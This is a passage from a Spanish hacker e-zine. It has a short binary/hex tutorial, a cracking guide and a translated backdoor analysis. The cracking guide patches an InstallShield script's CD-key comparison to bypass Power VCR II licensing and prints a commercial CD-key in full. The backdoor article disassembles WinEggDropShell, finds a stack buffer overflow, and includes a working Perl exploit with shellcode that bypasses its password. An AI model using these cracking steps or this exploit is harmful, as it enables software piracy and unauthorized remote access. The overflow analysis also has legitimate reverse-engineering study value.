<Si es que hasta ahora estan mas confundidos que Yo,no se preocupen esto es 
solo cultura General, Un mal necesario, necesitan conocer estas cosas, no para 
programar en asembler ,pero si para saber que estan haciendo. >

------------------------------------------------------------------------------

Alumno desesperado : Ya entendi, pero lo que quiero hacer es programar ya,
esto es muy facil.


Bueno pequenyo alumno, si eso es lo que quieres Club Fenix te quiere mostrar
algo


; - - - - - - - - - - - - - - - - - - - -
start: push  ds
sub   ax,ax
push  ax
mov   ax, DATASTUFF    ; carga ds
mov   ds,ax

outer_loop:
lea  ax, multiplicand
call get_unsigned_8byte
call print_unsigned_8byte
call get_unsigned
mov  multiplier, ax

lea  si, multiplicand
lea  bx, result
; - - - - - - - - - - - - - - - - - - - -



Entendes lo que que hacen estas instrucciones

Alumno deseperado (ahora palteado) : No maestro ?

Ves entonces hay que ir con calma.

No os preocupeis por lo que estas instrucciones hacen. ustedes aprenderan
eso despues. Lo que se esta tratando de hacer que tengan una idea de lo que 
esta pasando:

Para ello haremos un breve repaso de los sistemas Numericos ( Binario ) y
(Hexadecimal) estamos asumiendo que esto usted ya lo conoce, asi que solo hare 
un Repaso.

Base 2 (binario) permite solo 0s y 1s. 
Base 16 ( hexadecimal) permite 0 - 9, y ademas los proximos seis numeros usando
letras de la A - F. A=3D10, B=3D11, C=3D12, D=3D13, E=3D14 y F=3D15. Puedes
directamente traducir un numero hexadeximal a un numero binario y un binario
a un numero hexadecimal

Un grupo de cuatro dedos en el sistema binario es lo mismo que uno solo
dedo en el hexadecimal.

<SE PERDIERON... COMO LES DIGO NO SE PREOCUPEN POCO A POCO IRAN ENTENDIENDO
MEJOR>


BINARY         HEX      DECIMAL

0100            4          4
1111            F         15
1010            A         10
0011            3          3

AQUI TENEMOS UNOS NUMERO EN BINARIO, HEXADECIMAL Y DECIMAL, OBSERVEN UN POCO
ESTOS NUMEROS


ahora fijense en este pequenyo ejemplo tenemos el siguiente numero binario

0110011010101101

lo que vamos a hacer es dividirlo en grupos de 4 empezando por la derecha y 
resulta lo sgte

0110 0110 1010 1101

y ahora el cambio de cada grupo a un numero en Hexadecimal



0110 ->   4 + 2     ->   6
0110 ->   4 + 2     ->   6
1010 ->   8 + 2     ->   A
1101 ->   8 + 4 + 1 ->   D


Vieron, es lo mas sencillo, de igual manera de hexadecimal a binario

D39F

lo que haremos sera lo contrario a lo que hicimos para pasar de binario a
hexadecimal

es decir cada dedo hexadecimal son 4 dedos binarios de esta forma tenemos lo
sgte

D =3D 13    ->   8 + 4 + 1 ->   1101

Vieron lo facil que es.

Bueno no creo que debamos quedarnos mucho tiempo, en esto pero les recomiendo 
que lean algunos libros o manuales referente a los sistemas binarios y 
hexadecimales y pratiquen como convertir de hex a bin y de bin a hex, sera muy 
importante que conozcan esto.(ahora se que para algunos hay cosas que no han 
quedado claras, por eso si quieren aprender mas pueden hacer dos cosas.

1.esperar a que salga el 2do numero de Fenix (y hacerse viejos esperando)
2.entrar a la seccion de Boletines de la pagina de clubfenix.
  (www.geo51.com/clubfenix)
 




Hasta la proxima.


NOTA DEL AUTOR : Bueno hubiese querido mostrarles mas cosas, pero club
fenix impide que hagamos articulos grandes, asi que mas adelante ire poniendo 
cosas mas practicas y esperemos a que nos permitan escribir articulos muchos 
mas grandes


-[ 3x05 ]--------------------------------------------------------------------
-[ Cracking Power VCR ]------------------------------------------------------
-[ by The Ghost ]------------------------------------------------------------

Articulo publicado en la web de Club Fenix.
Aparece aqui a peticion suya.

-----------INSTALL SHIELDS Y SUS PROTECCIONES DE SIEMPRE---------------------


Ya no es novedad que installshields desde su version 0 hasta la 6.0 y de mas 
utilize las mismas protecciones de siempre, es decir ninguna.

el caso que tenemos aqui es muy particular, es un programa comercial 
perteneciente a Cyberlink tambien creador de Power Dvd el cual tambien no tiene
proteccion, mas aun el cd-key que pide Install Shields para continuar 
instalando Power Dvd se encuentra en el mismo codigo.

esta es la comparacion que hace install shields para instalar Power DvD


Continua instalando si Cd-key escrito por usuario tonto es igual al Cd-key 
de Proteccion Estupida

es decir si Cdkey ingresado es igual a DX8964387JDU seguir instalcion, SINO 
mostrar Mensaje.

es increible como No se pueda proteger mejor un programa de supuestamente 
una empresa respetable.


Pero vamos a crackear Power VcrII Standar ( aunque hasta verguenza me da 
decir crackear)

para ello utilizaremos un Bonito Compilador el SID, lo pueden encontrar en

http://protools.anticrack.de una de las mejoras paginas en cuanto a 
herramientas se refiere.

Ya descargado el programa y descomprimido abrimos el SID y hacemos click en 
File / open
y buscamos el famoso archivo de instalacion que utiliza install shields para 
generar su instalacion. para nuestro programa sera setup.inx

NOTA DEL EDITOR :
en otras versiones anteriores el archivo es setup.ins, para ello utilicen 
isdcc21 tambien se encuentra en protools.


Esperamos a que nuestro programita sea decompilado por SID. asi que mientras 
esperamos un rato
hacemos doble clik en setup.exe y tratamos de instalar POWER VCR II Cuando 
llegamos a la pantalla de Registro introducimos nuestros datos y una CD-KEY 
cualquiera.


y nos saldra una ventanita

-----------------------------------------
|GRAVE					|
|---------------------------------------|
|					|
|El cd-key que ha introducido no es	|
|valido.revise su informacion		|
|----------------------------------------

No es exactamente el mensaje, pero lo que tiene que quedar claro es el mensaje 
de error
Ahora si ustedes se van como locos queriendo buscar ese mensaje, no lo van 
encontrar en SID


Para ello install shields tiene otro archivito llamado value.shl que guarda 
todos los mensajes de errores y otros que no lo son, cuando install shields 
instala un programa lo guarda en la carpeta Temp que se encuentra dentro de 
WINDOW

ahi hay una carpeta que se encuentra entre corchetes 
{15465-e334435-fgfhghh5-hgghh} dentro estan
los archivos que ha descargado nuestro ya querido Install Shields.


NOTA:  los numeros y letras escritos en corchetes son solo numeros al azar, 
no necesariamente son estos,solo lo he puesto como ejemplo.

buscamos como locos Value.shl lo abrimos con wordpad, u otro editor de textos 
y vamos encontrar nuestro mensaje

En el caso de Power Vcr esta

INVALIDCDKEY=The product CD Key that you typed in is not correct.
The product serial number is provided with your shipment.


(dependiendo del lenguaje que hayamos seleccionado, saldra nuestro mensaje)

pero lo importante aqui no es en si el mensaje, mas bien El INVALIDCDKEY

asi que vayamos a SID que ya debe haber descompilado nuestro programa, y 
vamos a la opcion
view / message references



y buscamos nuestro famoso mensajito INVALIDCDKEY, Como SID es muy bueno ha 
ordenado los mensajes en orden alfabetico asi que vamos a todos lo mensajes 
que comienzen con I y encontramos el mensaje.


al hacer Clik encontramos lo sgte

function_4(global_string18);
global_number50 = LASTRESULT;
global_number57 = (global_number50 = 0);
if(global_number57) then // ref index: 2
function_351("INVALIDCDKEY");

hasta ahi tenemos algo importante, sabemos que nuestro mensaje esta englobado 
en global_numero57 el cual resulta de global_numero50 que tambien es calculado 
mucho mas arriba. pero no hay que complicarnos, para otra vez encontraremos el 
cd-key por ahora solo queremos pasar esa pantalla molesta que no nos deja 
instalar el programa.


Si vemos bien el codigo del programa  global_number57=(global_number50=0) 
pensemos un poco

si estamos familirizados con el arte del crackeo y hemos crackeado algun otro 
progama, hemos utilizado el cambio de 75 por 74, es decir cambio de 
instruciones que en vez de hacer lo que hace haga lo contrario.

asi si global_number= 0 que pasa si cambiamos esa condicion a otra cualquiera.

muy bien hagamoslo........ situemonos en el codigo 
global_number57=(global_number50=0)
Y HAGAMOS anticlick, encontraremos varias opciones, hagamos click en != y 
saldra lo sgte

global_number57 = (global_number50 = 0); // changed to "!="


ahora para que grabe los cambios vamos a FILE/PATCH CHANGES hacemos click 
confirmamos y listo

No nos emocionemos probemos si hemos hecho bien... instalamos normal 
escribimos nuestros datos

Cualquier CD-KEY, nos persinamos y hacemos click en siguiente (NEXT) y 
buala, el install shields
acepta el Key, YA NO interrupe la instalacion y prosigue normalmente.


NOTA DE THE GHOST:

En verdad no se si ha esto le pueda llamar programa crackeado, pero lo que 
si es cierto es que en ningun momento hay proteccion de los programas con 
install shields, ademas creo que no esta hecho para eso solo para servir de 
instaladores de programas, pero Cyberlink si es una empresa grande que cobra 
miles por sus programas, deberia pensar mejor en proteger sus programas.



-[ 3x06 ]--------------------------------------------------------------------
-[ Re-backdoors ]------------------------------------------------------------
-[ by FCA00000  ]------------------------------------------------------------

Re-backdoors

Este artículo es una traducción de
https://www.openrce.org/articles/full_view/18
Lo he traducido porque me ha parecido genial. No sólo la idea, sino el
estilo en el que está escrito.
Cualquier duda debe ser dirigida al autor original.


Instalar puertas traseras (backdoors) en los programas es un truco muy viejo
usado desde hace décadas.
Incluso las mismas puertas traseras incluyen otras puertas, por ejemplo el
famoso "master password" de SubSeven.
También existe gente que incluye en sus propios programas otros troyanos
hechos por otras personas.
Pero si vas a poner una puerta trasera en un troyano de acceso remoto, corres
el riesgo de arruinar tu reputación cuando se descubre el truco.
Después de todo, alguna de la gente que incluye tu código de troyano en su
programa son realmente paranoicos e insisten en verificar con un debugger
antes de confiar en tu código, para comprobar que es lo que tú dices que es.

Lo que se tiene al final es una situación parecida a los sistemas de protección
de shareware: quieres ocultar la super-clave para que la gente que desensambla
tu programa no la encuentre, pero, como en todos los sistemas de protección de
shareware, es sólo una cuestión de tiempo antes de que alguien la encuentre y
la rompa.

Por tanto, se necesita un enfoque mas sutil; algo que no use código sospechoso 
extra que añadir al archivo binario. Uno de estos métodos es usar un buffer
overflow. Cuando el cracker empiece a buscar el trozo de código que verifica la
clave, pasará por encima de tu puerta trasera sin ni siquiera darse cuenta.
Y, como beneficio extra, si te descubren, siempre puedes aducir que fue un
inocente error de programación, y salvar lo que quede de tu reputación,
arreglando el error y mandando un parche.

Aunque la comunidad de hackers ha especulado que este método podría ser muy
eficiente para poner una puerta trasera en el código, ?ha sido implementado
alguna vez? Bueno, ésa es una pregunta difícil; no se sabe a ciencia cierta.
No es nunca posible confirmar la razón escondida tras el fallo de overflow.
Eso sí, a veces el error es simplemente "demasiado oportuno" como para ser
un error; todo lo que queda es la sospecha.

Mientras investigaba una instrusión en un sistema, descubrí una puerta trasera
implementada por un chino, llamada WinEggDropShell v1.41 cuyo nombre proviene
de su autor WinEggDrop, que no esta relacionado con el IRC-bot que quizás te
sea mas conocido.
Por simple rutina, cargué el backdoor en el debugger OllyDbg para ver cómo
funcionaba. Es cierto que hay documentación del backdoor, escrita por su
propio autor, pero eso no me sirvió para nada, porque no sé hablar chino.

Para empezar, WinEggDropShell inyecta una DLL dentro del proceso winlogon.exe
Esta DLL está comprimida primero con Aspack y luego con EXE32Pack v1.38
Atendiendo a las recomendaciones de Brett Moore en las que nos explica que es
peligroso cargar en OllyDbg código sospechoso en DLLs, es necesario evitar
cualquier pre-interacción que ejecute el código.
Afortunadamente podemos evitar esto con un truco sencillo: le decimos a OllyDbg
que está cargando un ejecutable, no una DLL.

Para hacer esto, simplemente cargamos nuestra DLL con el programa Stud_PE (o tu
editor PE favorito) y editas la cabecera PE (si usas Stud_PE, esto es la
opcion "Advanced tree view in hexeditor")

Busca el nodo "Características" y el editor hexadecimal mostrará el campo
de 16 bits (little-endian) en la cabecera. En este caso, el valor es 0x2102, y
el bit 14 (0x2000) le dice al cargador que ésto es una librería de carga dinámica.
Podemos limpiar este flag editando el segundo byte de la palabra seleccionada,
cambiando 0x21 por 0x01.
Pulsa "Save to File" y renombra el archivo como .exe , y cárgalo en OllyDbg.
Ahora ya no se queja más de que el fichero es una DLL, y se detiene en la
cabecera de la DLL sin ejecutar el código de inicialización.

Como este artículo no trata sobre desempaquetado, dejaremos eso como un
ejercicio para el lector :-)

Tras examinar el archivo en OllyDbg, encuentro la rutina de entrada de datos
para la autentificación:

1000209E  PUSH EBP
1000209F  MOV EBP,ESP
100020A1  SUB ESP,1AC
100020A7  MOV ECX,6B
100020AC  /DEC ECX
100020AD  |MOV DWORD PTR SS:[ESP+ECX*4],FFFA5A5A
100020B4  \JNZ SHORT TBack.100020AC
100020B6  PUSH ESI
100020B7  PUSH EDI
100020B8  MOV EDI,DWORD PTR SS:[EBP+8]
100020BB  MOV DWORD PTR SS:[EBP+8],EDI
100020BE  MOV DWORD PTR SS:[EBP-188],0
100020C8  PUSH TBack.1003EC0D             ; /<%s> = "Enter Password:"
100020CD  PUSH TBack.10015210             ; |<%s> = ""
100020D2  PUSH TBack.1003EC1D             ; |format = "%s%s"
100020D7  LEA EDI,DWORD PTR SS:[EBP-180]  ; |
100020DD  PUSH EDI                        ; |s
100020DE  CALL TBack.10014E1C             ; \sprintf
100020E3  ADD ESP,10
100020E6  LEA EDI,DWORD PTR SS:[EBP-180]
100020EC  PUSH EDI                        ; /Arg2
100020ED  PUSH DWORD PTR SS:[EBP+8]       ; |Arg1
100020F0  CALL TBack.100067C5             ; \TBack.100067C5
100020F5  ADD ESP,8
100020F8  PUSH 100                        ; /n = 100 (256.)
100020FD  PUSH 0                          ; |c = 00
100020FF  LEA EDI,DWORD PTR SS:[EBP-180]  ; |
10002105  PUSH EDI                        ; |s
10002106  CALL TBack.10014DEC             ; \memset
1000210B  ADD ESP,0C
1000210E  CALL TBack.10014978             ; [GetTickCount]
10002113  MOV DWORD PTR SS:[EBP-184],EAX
10002119  /PUSH 80                        ; /n = 80 (128.)
1000211E  |PUSH 0                         ; |c = 00
10002120  |LEA EDI,DWORD PTR SS:[EBP-80]  ; |
10002123  |PUSH EDI                       ; |s
10002124  |CALL TBack.10014DEC            ; \memset
10002129  |ADD ESP,0C
1000212C  |PUSH 0                         ; /Flags = 0
1000212E  |PUSH 100                       ; |BufSize = 100 (256.)
10002133  |LEA EDI,DWORD PTR SS:[EBP-80]  ; |
10002136  |PUSH EDI                       ; |Buffer
10002137  |PUSH DWORD PTR SS:[EBP+8]      ; |Socket
1000213A  |CALL TBack.10014718            ; \recv

?No encuentras algo raro en la llamada a  recv  ? El tamaño del buffer se
define como 256, y el buffer está apuntado por EDI.
Pero justo antes de eso, vemos una llamada a memset usando EDI como buffer, que
extrañamente usa sólo 128 bytes!
?Porque limpia sólo la primera mitad del buffer? Mirando un poco más vemos
que EDI se carga con el puntero al stack [EBP-80] , lo que confirma que nuestro
buffer se ha definido sólo como char[128] al principio de la subrutina.

Al margen de si esto es intencional o no, tenemos la capacidad de sobrecargar
este buffer, simplemente mandando una clave de más de 128 caracteres.
Por supuesto, esto no sería interesante sin su correspondiente exploit:

#!/usr/bin/perl

## usage: ./weds.pl | nc  

$| = 1;

print STDERR "WinEggDropShell 1.41 Authentication Bypass Exploit\n";
print STDERR "By Joe Stewart <joe\@joestewart.org>\n";

print "\x90" x 109;       # relleno
print "\x0a\x00";            # salto_de_linea+null , para alimentar al sscanf
print "\x8d\xac\x24\x28\x04\x00\x00"; # LEA EBP,[ESP+428]   // arregla ebp
print "\x83\xc4\x04";              # ADD ESP,4           // arregal esp
print "\xb8\xb8\x33\x00\x10";   # MOV EAX, 0x100033B8 // rutina de confirmacion
print "\xff\xe0";               # JMP EAX             // salta
print "\x90\x90\x90\x90";       # no importa
print "\xa3\x39\x00\x10";       # direccion de "jmp esp"
print "\xeb\xe5";               # salta al shellcode

while () {
    print;
}

Directo al asunto. Incluso se podria haber hecho en una única linea :)
Y no hay necesidad de escribir un shellcode de acceso remoto, porque
WinEggDropShell ya es un shell de acceso remoto !

O sea que lo único que hacemos es usar el overflow para poner un mini-programa
en el stack, que salta directamente al sitio donde la autentificación se
considera exitosa, saltando por encima del chequeo de clave y dando acceso al
shell de comandos.
Si embargo, no se puede poner una dirección "buena" en el stack para que
retorne; hay que apañar el stack antes de eso. Para que retorne correctamente
hay que encontrar la instrucción típica "JMP ESP", que afortunadamente se
encuentra en 0x100039A3.

Por supuesto, sabemos que a los autores de troyanos les gusta poner puertas
traseras, pero antes de incluir este troyano en tu programa, ten en cuenta
que WinEggDropShell 1.41 es bastante viejo, y no escucha en un puerto
determinado. Así que no pierdas el tiempo.

La única pregunta que queda es: ?Es posible que un overflow tan obvio sea
un error de programación?


*EOF*